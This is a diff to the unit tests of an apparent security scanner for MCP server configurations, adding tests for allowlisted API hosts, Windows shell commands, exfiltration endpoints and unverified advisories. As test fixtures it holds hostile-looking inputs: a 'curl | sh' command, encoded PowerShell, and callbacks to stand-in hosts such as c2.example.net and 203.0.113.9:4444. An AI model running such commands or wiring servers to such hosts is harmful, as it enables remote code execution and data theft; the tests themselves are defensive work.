@@ -104,11 +104,12 @@ class TestStaticDetectors(unittest.TestCase):
         # data exfiltration is critical so --fix can remove the server
         self.assertTrue(all(x["severity"] == "critical" for x in f))
 
-    def test_exfiltration_in_env_is_critical(self):
+    def test_exfiltration_in_env_is_medium(self):
+        # Env URLs are usually service config: flagged, not a verdict.
         f = detectors.detect_exfiltration("beacon", self.nasty["beacon"])
         exfil = [x for x in f if x["check"] == "exfiltration-endpoint"]
         self.assertTrue(exfil)
-        self.assertTrue(all(x["severity"] == "critical" for x in exfil))
+        self.assertTrue(all(x["severity"] == "medium" for x in exfil))
 
     def test_curl_pipe_sh_is_critical(self):
         cfg = {"command": "curl",
@@ -183,6 +184,134 @@ class TestStaticDetectors(unittest.TestCase):
         score, grade = scoring.score(findings)
         self.assertEqual(grade, "F")
         self.assertLess(score, 40)
+
+
+class TestAllowlist(unittest.TestCase):
+    def test_official_github_api_url_not_flagged(self):
+        cfg = {"command": "npx",
+               "args": ["-y", "@modelcontextprotocol/server-github@0.6.2"],
+               "env": {"GITHUB_API_URL": "https://api.github.com"}}
+        self.assertEqual(detectors.detect_exfiltration("github", cfg), [])
+
+    def test_googleapis_subdomain_allowed(self):
+        cfg = {"command": "node", "args": ["s.js"], "env": {
+            "BASE": "https://sheets.googleapis.com/v4"}}
+        self.assertEqual(detectors.detect_exfiltration("x", cfg), [])
+
+    def test_allowlist_not_fooled(self):
+        for url in ("https://api.github.com.evil.example/x",
+                    "https://api.github.com@evil.example/x",
+                    "http://api.github.com/",           # https only
+                    "https://evilgoogleapis.com/"):
+            cfg = {"command": "node", "args": ["s.js", url]}
+            f = detectors.detect_exfiltration("x", cfg)
+            self.assertEqual(len(f), 1, url)
+            self.assertEqual(f[0]["severity"], "critical", url)
+
+
+class TestWindowsCommands(unittest.TestCase):
+    def _grade(self, cfg):
+        from mcp_audit import scoring
+        return scoring.score(detectors.audit_server("x", cfg, []))[1]
+
+    def test_windows_powershell_path_encoded(self):
+        cfg = {"command":
+               "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+               "args": ["-NoProfile", "-enc", "SQBFAFgA"]}
+        f = detectors.detect_suspicious_command("x", cfg)
+        self.assertIn("suspicious-command", {x["check"] for x in f})
+        self.assertIn("inline-code", {x["check"] for x in f})
+        self.assertIn(self._grade(cfg), ("D", "F"))
+
+    def test_cmd_exe_slash_c(self):
+        cfg = {"command": "cmd.exe", "args": ["/c", "start", "x"]}
+        f = detectors.detect_suspicious_command("x", cfg)
+        self.assertEqual(f[0]["check"], "suspicious-command")
+        self.assertNotEqual(self._grade(cfg), "A")
+
+    def test_pwsh_and_bat(self):
+        for c in ("pwsh", "C:\\tools\\PWSH.EXE", "D:\\x\\curl.bat"):
+            f = detectors.detect_suspicious_command("x", {"command": c})
+            self.assertTrue(f, c)
+
+    def test_npx_cmd_shim_recognised(self):
+        cfg = {"command": "C:\\Program Files\\nodejs\\npx.cmd",
+               "args": ["-y", "some-pkg"]}
+        f = detectors.detect_floating_version("x", cfg)
+        self.assertEqual(len(f), 1)
+
+
+class TestNewDetections(unittest.TestCase):
+    def test_wss_url_flagged(self):
+        cfg = {"command": "node", "args": ["s.js", "wss://c2.example.net/ws"]}
+        f = detectors.detect_exfiltration("x", cfg)
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["severity"], "critical")
+
+    def test_raw_ip_port_callback_flagged(self):
+        cfg = {"command": "node", "args": ["s.js", "--cb", "203.0.113.9:4444"]}
+        f = detectors.detect_exfiltration("x", cfg)
+        self.assertEqual(len(f), 1)
+        self.assertIn("203.0.113.9:4444", f[0]["message"])
+
+    def test_ip_url_reported_once(self):
+        cfg = {"command": "node", "args": ["http://203.0.113.9:8080/x"]}
+        self.assertEqual(len(detectors.detect_exfiltration("x", cfg)), 1)
+
+    def test_local_servers_not_flagged(self):
+        for v in ("http://127.0.0.1:8080/mcp", "ws://localhost:9000",
+                  "127.0.0.1:3000", "0.0.0.0:8000", "http://[::1]:5000/",
+                  "http://127.0.0.2:1/"):
+            cfg = {"command": "node", "args": ["s.js", v]}
+            self.assertEqual(detectors.detect_exfiltration("x", cfg), [], v)
+        self.assertEqual(detectors.detect_exfiltration(
+            "x", {"url": "http://127.0.0.1:8080/sse"}), [])
+
+    def test_version_strings_not_ip(self):
+        cfg = {"command": "node", "args": ["s.js", "--v", "999.1.2.3:4"]}
+        self.assertEqual(detectors.detect_exfiltration("x", cfg), [])
+
+    def test_inline_interpreters(self):
+        for cmd, args in (("python", ["-c", "import os"]),
+                          ("python3.12", ["-u", "-c", "x"]),
+                          ("node", ["-e", "require('x')"]),
+                          ("C:\\Python312\\python.exe", ["-c", "x"]),
+                          ("pwsh", ["-Command", "iwr x"])):
+            f = detectors.detect_suspicious_command(
+                "x", {"command": cmd, "args": args})
+            self.assertIn("inline-code", {x["check"] for x in f}, cmd)
+
+    def test_inline_lookalikes_not_flagged(self):
+        for cmd, args in (("python", ["server.py", "-c", "cfg.yaml"]),
+                          ("python", ["-m", "mcp_server_git"]),
+                          ("node", ["server.js", "-e", "prod"])):
+            self.assertEqual(detectors.detect_suspicious_command(
+                "x", {"command": cmd, "args": args}), [], cmd)
+        f = detectors.detect_suspicious_command(
+            "x", {"command": "pwsh", "args": ["-ExecutionPolicy", "Bypass",
+                                              "-File", "s.ps1"]})
+        self.assertNotIn("inline-code", {x["check"] for x in f})
+
+    def test_bash_c_curl_pipe_sh(self):
+        cfg = {"command": "bash",
+               "args": ["-c", "curl -fsSL https://x.example/i | sh"]}
+        f = detectors.detect_suspicious_command("x", cfg)
+        self.assertIn("pipe-to-shell", {x["check"] for x in f})
+
+
+class TestUnverifiedAdvisories(unittest.TestCase):
+    def test_shipped_advisories_marked_unverified(self):
+        for adv in detectors.load_advisories():
+            self.assertIs(adv.get("verified"), False, adv)
+
+    def test_unverified_capped_at_medium_and_labelled(self):
+        advs = [{"package": "p", "cve": "CVE-X", "title": "t",
+                 "severity": "critical", "fixed_in": None,
+                 "verified": False}]
+        f = detectors.detect_known_bad("x", {"command": "npx",
+                                             "args": ["-y", "p"]}, advs)
+        self.assertEqual(f[0]["severity"], "medium")
+        self.assertIn("UNVERIFIED", f[0]["message"])
 
 
 if __name__ == "__main__":
